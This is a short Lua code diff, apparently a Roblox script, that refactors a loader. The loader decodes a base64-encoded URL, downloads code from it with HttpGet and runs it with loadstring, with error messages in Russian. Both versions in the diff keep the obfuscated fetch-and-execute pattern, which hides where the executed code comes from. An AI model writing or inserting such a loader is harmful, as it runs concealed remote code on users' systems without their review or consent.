@@ -16,13 +16,11 @@ local function base64Decode(data)
     end))
 end
 
-local scriptURL = base64Decode(encodedScript)
-local success, response = pcall(function()
-    return game:HttpGet(scriptURL, true)
-end)
+local decodedURL = base64Decode(encodedScript)
+local success, loadedScript = pcall(game.HttpGet, game, decodedURL, true)
 
 if success then
-    loadstring(response)()
+    loadstring(loadedScript)()
 else
-    warn("Ошибка загрузки скрипта: " .. tostring(response))
+    warn("[Ошибка] Не удалось загрузить скрипт: " .. tostring(loadedScript))
 end
